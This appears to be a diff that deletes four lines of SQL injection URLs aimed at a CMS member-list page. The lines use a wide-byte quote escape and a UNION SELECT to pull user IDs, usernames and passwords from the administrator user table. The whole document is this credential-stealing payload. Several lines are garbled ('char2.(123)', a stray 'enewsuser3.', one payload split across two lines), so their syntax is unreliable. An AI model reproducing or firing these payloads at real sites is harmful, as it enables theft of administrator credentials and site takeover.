@@ -1,4 +1,0 @@
-/e/member/list/index.php?sear=1&totalnum=1&keyboard=%D9'+union+select+1,1,1,concat(char2.(123),userid,char(95),username,char(95),password,char(125))+from+phome_enewsuser3. 
-/e/member/list/index.php?sear=1&totalnum=1&keyboard=%D9'+union+select+1,1,1,concat(char2.(123),userid,char(95),username,char(95),password,char(125))+from+phome_enewsuser/*
-/e/member/list/index.php?sear=1&totalnum=1&keyboard=%D9''+union+select+1,1,1,concat(char
-(123),userid,char(95),username,char(95),password,char(125))+from+phome_enewsuser/*
